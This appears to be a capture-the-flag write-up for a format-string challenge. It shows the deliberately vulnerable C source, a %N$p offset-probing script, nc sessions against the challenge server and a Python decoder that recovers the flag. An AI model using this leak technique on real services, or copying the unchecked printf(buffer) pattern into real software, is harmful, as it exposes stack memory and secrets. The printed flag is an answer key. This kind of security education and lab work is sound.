# PWN warm up

**_Format String + Memory Leak_**

This challenge involves a binary vulnerable to format string exploitation. The binary loads a `flag` file into memory before handling user input, which is directly printed using a format string vulnerability.

## Source Code Analysis

Here is the source code for the binary (chall.c):

```c
//gcc -fno-pie -no-pie -fno-stack-protector ./chall.c -o chall
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void vuln()
{
    char buffer[16];
    char flag[16];
    FILE *file = fopen("./flag", "r");
    if (file == NULL) {
        perror("Error opening ./flag");
        return;
    }
    fscanf(file, "%15s", flag);

    printf("u give input, i print out your input\n");
    printf("Input: ");
    fgets(buffer, sizeof(buffer), stdin);
    printf("Your input is: ");
    printf(buffer);  // Vulnerable line
    return;
}

int main()
{
    initialize();

    vuln();
    return 0;
}
```

### Vulnerability Details

- **Format String Vulnerability**: The `printf(buffer);` call in the `vuln()` function directly prints user input without specifying a format string. This allows attackers to exploit format string specifiers like `%p` to leak memory addresses or other sensitive data.
- **Flag Handling**: The `flag` is read into a stack buffer (`flag[16]`) before user input is processed. This means the flag resides in memory and can potentially be leaked through the vulnerability.

## Exploitation Steps

### Step 1: Confirm Format String Vulnerability

To test the format string vulnerability, initially, an error occurs due to the absence of the `flag` file:

```bash
┌──(kali㉿kali)-[~/CSLU/PWN1]
└─$ ./chall 
Error opening ./flag: No such file or directory
```

To proceed, a dummy flag file is placed in the same directory:

```bash
┌──(kali㉿kali)-[~/CSLU/PWN1]
└─$ echo "FLAG" > flag  

┌──(kali㉿kali)-[~/CSLU/PWN1]
└─$ cat flag 
FLAG
```

Running the binary and providing `%p` as input confirms the vulnerability:

```bash
./chall
Input: %p %p %p %p %p
Your input is: 0x7ffe02d61b60 (nil) (nil) 0x1 (nil)
```

### Step 2: Find Format String Offset

To determine the correct offset for the format string vulnerability, a script (`findOffset.sh`) can be used:

```bash
#!/bin/bash

for i in $(seq 100)
do
    echo "Offset $i : %$i\$p" | ./chall
done
```

Running this script reveals the flag's offset. For instance:

```bash
┌──(kali㉿kali)-[~/CSLU/PWN1]
└─$ ./findOffset.sh | grep "47414c46"
Input: Your input is: Offset 6 : 0x47414c46 u give input, i print out your input
```

The result shows the flag's hex representation (e.g., `47414c46` for `FLAG`, reversed due to little-endianness). The first 8 bytes of the flag are at offset 6, and the next 8 bytes are at offset 7.

### Step 3: Leak the Full Flag

Using the determined offsets, the full flag can be reconstructed. For example:

```bash
┌──(kali㉿kali)-[~/CSLU/PWN1]
└─$ nc 5.75.155.50 10001
u give input, i print out your input
Input: %6$p
Your input is: 0x726f667b554c5343

┌──(kali㉿kali)-[~/CSLU/PWN1]
└─$ nc 5.75.155.50 10001
u give input, i print out your input
Input: %7$p        
Your input is: 0x7d72747374346d
```

Then, use Python to convert and reverse the bytes:

```python
import struct
flag_part1 = struct.pack("<Q", 0x726f667b554c5343).decode()
flag_part2 = struct.pack("<Q", 0x7d72747374346d).decode()  # Replace with the next leak
flag = flag_part1 + flag_part2
print(flag)
```

Result:

```bash
┌──(kali㉿kali)-[~/CSLU/PWN1]
└─$ python3 hexToBytes_FlipLittleEndianness.py
CSLU{form4tstr}
```

## Conclusion

By leveraging the format string vulnerability, we successfully leaked the flag stored in the stack. This challenge demonstrates the importance of using secure coding practices, such as always specifying format strings explicitly in functions like `printf`. Let me know if there are additional details to refine or expand!
